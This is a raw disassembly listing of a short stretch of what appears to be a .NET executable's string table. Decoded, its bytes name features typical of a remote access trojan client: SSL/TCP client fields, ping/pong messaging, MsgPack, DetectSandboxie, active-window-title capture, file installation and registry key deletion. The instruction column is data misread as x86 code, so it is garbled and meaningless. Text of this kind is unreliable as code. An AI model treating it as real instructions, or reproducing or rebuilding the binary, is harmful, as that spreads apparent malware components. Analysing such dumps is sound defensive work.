  407c01:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c04:	6e                   	outsb  %ds:(%esi),(%dx)
  407c05:	67 46                	addr16 inc %esi
  407c07:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c0e:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c15:	42                   	inc    %edx
  407c16:	61                   	popa
  407c17:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c1a:	6e                   	outsb  %ds:(%esi),(%dx)
  407c1b:	67 46                	addr16 inc %esi
  407c1d:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c24:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c28:	61                   	popa
  407c29:	74 65                	je     0x407c90
  407c2b:	50                   	push   %eax
  407c2c:	6f                   	outsl  %ds:(%esi),(%dx)
  407c2d:	6e                   	outsb  %ds:(%esi),(%dx)
  407c2e:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c34:	61                   	popa
  407c35:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c38:	6e                   	outsb  %ds:(%esi),(%dx)
  407c39:	67 46                	addr16 inc %esi
  407c3b:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c42:	6e                   	outsb  %ds:(%esi),(%dx)
  407c43:	74 65                	je     0x407caa
  407c45:	72 76                	jb     0x407cbd
  407c47:	61                   	popa
  407c48:	6c                   	insb   (%dx),%es:(%edi)
  407c49:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c4e:	61                   	popa
  407c4f:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c52:	6e                   	outsb  %ds:(%esi),(%dx)
  407c53:	67 46                	addr16 inc %esi
  407c55:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c5c:	75 66                	jne    0x407cc4
  407c5e:	66 65 72 3e          	data16 gs jb 0x407ca0
  407c62:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c66:	61                   	popa
  407c67:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c6a:	6e                   	outsb  %ds:(%esi),(%dx)
  407c6b:	67 46                	addr16 inc %esi
  407c6d:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c74:	66 66 73 65          	data16 data16 jae 0x407cdd
  407c78:	74 3e                	je     0x407cb8
  407c7a:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c7e:	61                   	popa
  407c7f:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c82:	6e                   	outsb  %ds:(%esi),(%dx)
  407c83:	67 46                	addr16 inc %esi
  407c85:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c8c:	73 6c                	jae    0x407cfa
  407c8e:	43                   	inc    %ebx
  407c8f:	6c                   	insb   (%dx),%es:(%edi)
  407c90:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407c97:	5f                   	pop    %edi
  407c98:	42                   	inc    %edx
  407c99:	61                   	popa
  407c9a:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c9d:	6e                   	outsb  %ds:(%esi),(%dx)
  407c9e:	67 46                	addr16 inc %esi
  407ca0:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407ca7:	63 70 43             	arpl   %esi,0x43(%eax)
  407caa:	6c                   	insb   (%dx),%es:(%edi)
  407cab:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407cb2:	5f                   	pop    %edi
  407cb3:	42                   	inc    %edx
  407cb4:	61                   	popa
  407cb5:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407cb8:	6e                   	outsb  %ds:(%esi),(%dx)
  407cb9:	67 46                	addr16 inc %esi
  407cbb:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407cc2:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc3:	65 72 41             	gs jb  0x407d07
  407cc6:	64 64 4d             	fs fs dec %ebp
  407cc9:	61                   	popa
  407cca:	70 43                	jo     0x407d0f
  407ccc:	68 69 6c 64 00       	push   $0x646c69
  407cd1:	49                   	dec    %ecx
  407cd2:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd3:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd4:	65 72 41             	gs jb  0x407d18
  407cd7:	64 64 41             	fs fs inc %ecx
  407cda:	72 72                	jb     0x407d4e
  407cdc:	61                   	popa
  407cdd:	79 43                	jns    0x407d22
  407cdf:	68 69 6c 64 00       	push   $0x646c69
  407ce4:	68 57 6e 64 00       	push   $0x646e57
  407ce9:	53                   	push   %ebx
  407cea:	65 6e                	outsb  %gs:(%esi),(%dx)
  407cec:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407cf0:	70 65                	jo     0x407d57
  407cf2:	6e                   	outsb  %ds:(%esi),(%dx)
  407cf3:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407cf7:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407cfe:	61 
  407cff:	6c                   	insb   (%dx),%es:(%edi)
  407d00:	75 65                	jne    0x407d67
  407d02:	4b                   	dec    %ebx
  407d03:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d0a:	6c                   	insb   (%dx),%es:(%edi)
  407d0b:	61                   	popa
  407d0c:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d0f:	43                   	inc    %ebx
  407d10:	72 65                	jb     0x407d77
  407d12:	61                   	popa
  407d13:	74 65                	je     0x407d7a
  407d15:	49                   	dec    %ecx
  407d16:	6e                   	outsb  %ds:(%esi),(%dx)
  407d17:	73 74                	jae    0x407d8d
  407d19:	61                   	popa
  407d1a:	6e                   	outsb  %ds:(%esi),(%dx)
  407d1b:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d1e:	73 65                	jae    0x407d85
  407d20:	74 5f                	je     0x407d81
  407d22:	4d                   	dec    %ebp
  407d23:	6f                   	outsl  %ds:(%esi),(%dx)
  407d24:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d29:	6c                   	insb   (%dx),%es:(%edi)
  407d2a:	65 4d                	gs dec %ebp
  407d2c:	6f                   	outsl  %ds:(%esi),(%dx)
  407d2d:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d32:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d39:	64 65 
  407d3b:	00 45 6e             	add    %al,0x6e(%ebp)
  407d3e:	74 65                	je     0x407da5
  407d40:	72 44                	jb     0x407d86
  407d42:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d46:	4d                   	dec    %ebp
  407d47:	6f                   	outsl  %ds:(%esi),(%dx)
  407d48:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d4d:	79 70                	jns    0x407dbf
  407d4f:	74 6f                	je     0x407dc0
  407d51:	53                   	push   %ebx
  407d52:	74 72                	je     0x407dc6
  407d54:	65 61                	gs popa
  407d56:	6d                   	insl   (%dx),%es:(%edi)
  407d57:	4d                   	dec    %ebp
  407d58:	6f                   	outsl  %ds:(%esi),(%dx)
  407d59:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d5e:	6d                   	insl   (%dx),%es:(%edi)
  407d5f:	70 72                	jo     0x407dd3
  407d61:	65 73 73             	gs jae 0x407dd7
  407d64:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d6b:	00 43 69             	add    %al,0x69(%ebx)
  407d6e:	70 68                	jo     0x407dd8
  407d70:	65 72 4d             	gs jb  0x407dc0
  407d73:	6f                   	outsl  %ds:(%esi),(%dx)
  407d74:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d79:	6c                   	insb   (%dx),%es:(%edi)
  407d7a:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d7f:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d84:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d88:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d8b:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d90:	65 74 65             	gs je  0x407df8
  407d93:	53                   	push   %ebx
  407d94:	75 62                	jne    0x407df8
  407d96:	4b                   	dec    %ebx
  407d97:	65 79 54             	gs jns 0x407dee
  407d9a:	72 65                	jb     0x407e01
  407d9c:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407da0:	74 5f                	je     0x407e01
  407da2:	4d                   	dec    %ebp
  407da3:	65 73 73             	gs jae 0x407e19
  407da6:	61                   	popa
  407da7:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407dac:	74 65                	je     0x407e13
  407dae:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407db2:	6e                   	outsb  %ds:(%esi),(%dx)
  407db3:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407db7:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407dbe:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407dc2:	45                   	inc    %ebp
  407dc3:	6e                   	outsb  %ds:(%esi),(%dx)
  407dc4:	75 6d                	jne    0x407e33
  407dc6:	65 72 61             	gs jb  0x407e2a
  407dc9:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407dcd:	49                   	dec    %ecx
  407dce:	44                   	inc    %esp
  407dcf:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407dd6:	6c                   	insb   (%dx),%es:(%edi)
  407dd7:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407ddc:	6f                   	outsl  %ds:(%esi),(%dx)
  407ddd:	75 62                	jne    0x407e41
  407ddf:	6c                   	insb   (%dx),%es:(%edi)
  407de0:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407de4:	61                   	popa
  407de5:	70 44                	jo     0x407e2b
  407de7:	6f                   	outsl  %ds:(%esi),(%dx)
  407de8:	75 62                	jne    0x407e4c
  407dea:	6c                   	insb   (%dx),%es:(%edi)
  407deb:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407def:	74 5f                	je     0x407e50
  407df1:	48                   	dec    %eax
  407df2:	61                   	popa
  407df3:	6e                   	outsb  %ds:(%esi),(%dx)
  407df4:	64 6c                	fs insb (%dx),%es:(%edi)
  407df6:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407dfa:	6e                   	outsb  %ds:(%esi),(%dx)
  407dfb:	74 69                	je     0x407e66
  407dfd:	6d                   	insl   (%dx),%es:(%edi)
  407dfe:	65 46                	gs inc %esi
  407e00:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407e07:	64 6c                	fs insb (%dx),%es:(%edi)
  407e09:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e0d:	74 4d                	je     0x407e5c
  407e0f:	6f                   	outsl  %ds:(%esi),(%dx)
  407e10:	64 75 6c             	fs jne 0x407e7f
  407e13:	65 48                	gs dec %eax
  407e15:	61                   	popa
  407e16:	6e                   	outsb  %ds:(%esi),(%dx)
  407e17:	64 6c                	fs insb (%dx),%es:(%edi)
  407e19:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e1d:	6e                   	outsb  %ds:(%esi),(%dx)
  407e1e:	74 69                	je     0x407e89
  407e20:	6d                   	insl   (%dx),%es:(%edi)
  407e21:	65 54                	gs push %esp
  407e23:	79 70                	jns    0x407e95
  407e25:	65 48                	gs dec %eax
  407e27:	61                   	popa
  407e28:	6e                   	outsb  %ds:(%esi),(%dx)
  407e29:	64 6c                	fs insb (%dx),%es:(%edi)
  407e2b:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e2f:	74 54                	je     0x407e85
  407e31:	79 70                	jns    0x407ea3
  407e33:	65 46                	gs inc %esi
  407e35:	72 6f                	jb     0x407ea6
  407e37:	6d                   	insl   (%dx),%es:(%edi)
  407e38:	48                   	dec    %eax
  407e39:	61                   	popa
  407e3a:	6e                   	outsb  %ds:(%esi),(%dx)
  407e3b:	64 6c                	fs insb (%dx),%es:(%edi)
  407e3d:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e41:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e48:	65 
  407e49:	00 57 72             	add    %dl,0x72(%edi)
  407e4c:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e53:	6c 
  407e54:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e59:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e60:	65 74 41             	gs je  0x407ea4
  407e63:	73 53                	jae    0x407eb8
  407e65:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e6c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e6d:	73 74                	jae    0x407ee3
  407e6f:	61                   	popa
  407e70:	6c                   	insb   (%dx),%es:(%edi)
  407e71:	6c                   	insb   (%dx),%es:(%edi)
  407e72:	46                   	inc    %esi
  407e73:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e7a:	6f 
  407e7b:	64 65 46             	fs gs inc %esi
  407e7e:	72 6f                	jb     0x407eef
  407e80:	6d                   	insl   (%dx),%es:(%edi)
  407e81:	46                   	inc    %esi
  407e82:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e89:	65 
  407e8a:	42                   	inc    %edx
  407e8b:	79 74                	jns    0x407f01
  407e8d:	65 73 54             	gs jae 0x407ee4
  407e90:	6f                   	outsl  %ds:(%esi),(%dx)
  407e91:	46                   	inc    %esi
  407e92:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407e99:	6e 
  407e9a:	52                   	push   %edx
  407e9b:	6f                   	outsl  %ds:(%esi),(%dx)
  407e9c:	6c                   	insb   (%dx),%es:(%edi)
  407e9d:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407ea1:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea2:	64 6f                	outsl  %fs:(%esi),(%dx)
  407ea4:	77 73                	ja     0x407f19
  407ea6:	42                   	inc    %edx
  407ea7:	75 69                	jne    0x407f12
  407ea9:	6c                   	insb   (%dx),%es:(%edi)
  407eaa:	74 49                	je     0x407ef5
  407eac:	6e                   	outsb  %ds:(%esi),(%dx)
  407ead:	52                   	push   %edx
  407eae:	6f                   	outsl  %ds:(%esi),(%dx)
  407eaf:	6c                   	insb   (%dx),%es:(%edi)
  407eb0:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407eb4:	74 41                	je     0x407ef7
  407eb6:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407eba:	65 57                	gs push %edi
  407ebc:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407ec3:	74 6c                	je     0x407f31
  407ec5:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ec9:	74 5f                	je     0x407f2a
  407ecb:	4d                   	dec    %ebp
  407ecc:	61                   	popa
  407ecd:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407ed4:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ed8:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed9:	63 65 73             	arpl   %esp,0x73(%ebp)
  407edc:	73 4d                	jae    0x407f2b
  407ede:	6f                   	outsl  %ds:(%esi),(%dx)
  407edf:	64 75 6c             	fs jne 0x407f4e
  407ee2:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407ee6:	74 5f                	je     0x407f47
  407ee8:	57                   	push   %edi
  407ee9:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407ef0:	79 6c                	jns    0x407f5e
  407ef2:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ef6:	6f                   	outsl  %ds:(%esi),(%dx)
  407ef7:	63 65 73             	arpl   %esp,0x73(%ebp)
  407efa:	73 57                	jae    0x407f53
  407efc:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407f03:	79 6c                	jns    0x407f71
  407f05:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f09:	74 5f                	je     0x407f6a
  407f0b:	4e                   	dec    %esi
  407f0c:	61                   	popa
  407f0d:	6d                   	insl   (%dx),%es:(%edi)
  407f0e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f12:	74 5f                	je     0x407f73
  407f14:	46                   	inc    %esi
  407f15:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f1c:	00 
  407f1d:	73 65                	jae    0x407f84
  407f1f:	74 5f                	je     0x407f80
  407f21:	46                   	inc    %esi
  407f22:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f29:	00 
  407f2a:	47                   	inc    %edi
  407f2b:	65 74 54             	gs je  0x407f82
  407f2e:	65 6d                	gs insl (%dx),%es:(%edi)
  407f30:	70 46                	jo     0x407f78
  407f32:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f39:	00 
  407f3a:	47                   	inc    %edi
  407f3b:	65 74 46             	gs je  0x407f84
  407f3e:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f45:	00 
  407f46:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f4d:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f52:	6f                   	outsl  %ds:(%esi),(%dx)
  407f53:	64 75 6c             	fs jne 0x407fc2
  407f56:	65 4e                	gs dec %esi
  407f58:	61                   	popa
  407f59:	6d                   	insl   (%dx),%es:(%edi)
  407f5a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f5e:	74 5f                	je     0x407fbf
  407f60:	4d                   	dec    %ebp
  407f61:	61                   	popa
  407f62:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f65:	6e                   	outsb  %ds:(%esi),(%dx)
  407f66:	65 4e                	gs dec %esi
  407f68:	61                   	popa
  407f69:	6d                   	insl   (%dx),%es:(%edi)
  407f6a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f6e:	74 5f                	je     0x407fcf
  407f70:	4f                   	dec    %edi
  407f71:	53                   	push   %ebx
  407f72:	46                   	inc    %esi
  407f73:	75 6c                	jne    0x407fe1
  407f75:	6c                   	insb   (%dx),%es:(%edi)
  407f76:	4e                   	dec    %esi
  407f77:	61                   	popa
  407f78:	6d                   	insl   (%dx),%es:(%edi)
  407f79:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f7d:	74 5f                	je     0x407fde
  407f7f:	46                   	inc    %esi
  407f80:	75 6c                	jne    0x407fee
  407f82:	6c                   	insb   (%dx),%es:(%edi)
  407f83:	4e                   	dec    %esi
  407f84:	61                   	popa
  407f85:	6d                   	insl   (%dx),%es:(%edi)
  407f86:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f8a:	56                   	push   %esi
  407f8b:	61                   	popa
  407f8c:	6c                   	insb   (%dx),%es:(%edi)
  407f8d:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407f94:	6e 
  407f95:	4e                   	dec    %esi
  407f96:	61                   	popa
  407f97:	6d                   	insl   (%dx),%es:(%edi)
  407f98:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f9c:	74 5f                	je     0x407ffd
  407f9e:	55                   	push   %ebp
  407f9f:	73 65                	jae    0x408006
  407fa1:	72 4e                	jb     0x407ff1
  407fa3:	61                   	popa
  407fa4:	6d                   	insl   (%dx),%es:(%edi)
  407fa5:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407faa:	65 72 4e             	gs jb  0x407ffb
  407fad:	61                   	popa
  407fae:	6d                   	insl   (%dx),%es:(%edi)
  407faf:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407fb3:	74 4e                	je     0x408003
  407fb5:	61                   	popa
  407fb6:	6d                   	insl   (%dx),%es:(%edi)
  407fb7:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fbb:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fbf:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc0:	73 74                	jae    0x408036
  407fc2:	4e                   	dec    %esi
  407fc3:	61                   	popa
  407fc4:	6d                   	insl   (%dx),%es:(%edi)
  407fc5:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fc9:	6d                   	insl   (%dx),%es:(%edi)
  407fca:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fcf:	65 54                	gs push %esp
  407fd1:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fd8:	5f                   	pop    %edi
  407fd9:	4c                   	dec    %esp
  407fda:	61                   	popa
  407fdb:	73 74                	jae    0x408051
  407fdd:	57                   	push   %edi
  407fde:	72 69                	jb     0x408049
  407fe0:	74 65                	je     0x408047
  407fe2:	54                   	push   %esp
  407fe3:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407fea:	6e                   	outsb  %ds:(%esi),(%dx)
  407feb:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407ff2:	54                   	push   %esp
  407ff3:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  407ffa:	74 65                	je     0x408061
  407ffc:	4c                   	dec    %esp
  407ffd:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408004:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408007:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  40800b:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408012:	6d                   	insl   (%dx),%es:(%edi)
  408013:	65 54                	gs push %esp
  408015:	79 70                	jns    0x408087
  408017:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40801b:	74 5f                	je     0x40807c
  40801d:	56                   	push   %esi
  40801e:	61                   	popa
  40801f:	6c                   	insb   (%dx),%es:(%edi)
  408020:	75 65                	jne    0x408087
  408022:	54                   	push   %esp
  408023:	79 70                	jns    0x408095
  408025:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  408029:	6c                   	insb   (%dx),%es:(%edi)
  40802a:	75 65                	jne    0x408091
  40802c:	54                   	push   %esp
  40802d:	79 70                	jns    0x40809f
  40802f:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  408033:	67 50                	addr16 push %eax
  408035:	61                   	popa
  408036:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  408039:	79 70                	jns    0x4080ab
  40803b:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40803f:	6f                   	outsl  %ds:(%esi),(%dx)
  408040:	74 6f                	je     0x4080b1
  408042:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408045:	54                   	push   %esp
  408046:	79 70                	jns    0x4080b8
  408048:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40804c:	74 54                	je     0x4080a2
  40804e:	79 70                	jns    0x4080c0
  408050:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  408054:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408057:	74 54                	je     0x4080ad
  408059:	79 70                	jns    0x4080cb
  40805b:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  40805f:	6c                   	insb   (%dx),%es:(%edi)
  408060:	65 53                	gs push %ebx
  408062:	68 61 72 65 00       	push   $0x657261
  408067:	53                   	push   %ebx
  408068:	79 73                	jns    0x4080dd
  40806a:	74 65                	je     0x4080d1
  40806c:	6d                   	insl   (%dx),%es:(%edi)
  40806d:	2e 43                	cs inc %ebx
  40806f:	6f                   	outsl  %ds:(%esi),(%dx)
  408070:	72 65                	jb     0x4080d7
  408072:	00 53 65             	add    %dl,0x65(%ebx)
  408075:	72 76                	jb     0x4080ed
  408077:	65 72 73             	gs jb  0x4080ed
  40807a:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  408081:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  408085:	6f                   	outsl  %ds:(%esi),(%dx)
  408086:	73 65                	jae    0x4080ed
  408088:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  40808c:	70 6f                	jo     0x4080fd
  40808e:	73 65                	jae    0x4080f5
  408090:	00 50 61             	add    %dl,0x61(%eax)
  408093:	72 73                	jb     0x408108
  408095:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408099:	72 52                	jb     0x4080ed
  40809b:	65 76 65             	gs jbe 0x408103
  40809e:	72 73                	jb     0x408113
  4080a0:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4080a4:	30 39                	xor    %bh,(%ecx)
  4080a6:	43                   	inc    %ebx
  4080a7:	65 72 74             	gs jb  0x40811e
  4080aa:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080b1:	00 56 61             	add    %dl,0x61(%esi)
  4080b4:	6c                   	insb   (%dx),%es:(%edi)
  4080b5:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080bc:	72 
  4080bd:	76 65                	jbe    0x408124
  4080bf:	72 43                	jb     0x408104
  4080c1:	65 72 74             	gs jb  0x408138
  4080c4:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080cb:	00 63 65             	add    %ah,0x65(%ebx)
  4080ce:	72 74                	jb     0x408144
  4080d0:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080d7:	00 43 72             	add    %al,0x72(%ebx)
  4080da:	65 61                	gs popa
  4080dc:	74 65                	je     0x408143
  4080de:	00 53 65             	add    %dl,0x65(%ebx)
  4080e1:	74 54                	je     0x408137
  4080e3:	68 72 65 61 64       	push   $0x64616572
  4080e8:	45                   	inc    %ebp
  4080e9:	78 65                	js     0x408150
  4080eb:	63 75 74             	arpl   %esi,0x74(%ebp)
  4080ee:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4080f5:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4080fa:	65 74 65             	gs je  0x408162
  4080fd:	00 43 61             	add    %al,0x61(%ebx)
  408100:	6c                   	insb   (%dx),%es:(%edi)
  408101:	6c                   	insb   (%dx),%es:(%edi)
  408102:	53                   	push   %ebx
  408103:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  40810a:	74 
  40810b:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40810f:	6d                   	insl   (%dx),%es:(%edi)
  408110:	70 69                	jo     0x40817b
  408112:	6c                   	insb   (%dx),%es:(%edi)
  408113:	65 72 47             	gs jb  0x40815d
  408116:	65 6e                	outsb  %gs:(%esi),(%dx)
  408118:	65 72 61             	gs jb  0x40817c
  40811b:	74 65                	je     0x408182
  40811d:	64 41                	fs inc %ecx
  40811f:	74 74                	je     0x408195
  408121:	72 69                	jb     0x40818c
  408123:	62 75 74             	bound  %esi,0x74(%ebp)
  408126:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40812b:	75 67                	jne    0x408194
  40812d:	67 61                	addr16 popa
  40812f:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408133:	74 74                	je     0x4081a9
  408135:	72 69                	jb     0x4081a0
  408137:	62 75 74             	bound  %esi,0x74(%ebp)
  40813a:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40813e:	6d                   	insl   (%dx),%es:(%edi)
  40813f:	56                   	push   %esi
  408140:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408147:	74 74                	je     0x4081bd
  408149:	72 69                	jb     0x4081b4
  40814b:	62 75 74             	bound  %esi,0x74(%ebp)
  40814e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408152:	73 65                	jae    0x4081b9
  408154:	6d                   	insl   (%dx),%es:(%edi)
  408155:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408159:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408160:	72 
  408161:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408168:	73 73                	jae    0x4081dd
  40816a:	65 6d                	gs insl (%dx),%es:(%edi)
  40816c:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408170:	72 61                	jb     0x4081d3
  408172:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408175:	61                   	popa
  408176:	72 6b                	jb     0x4081e3
  408178:	41                   	inc    %ecx
  408179:	74 74                	je     0x4081ef
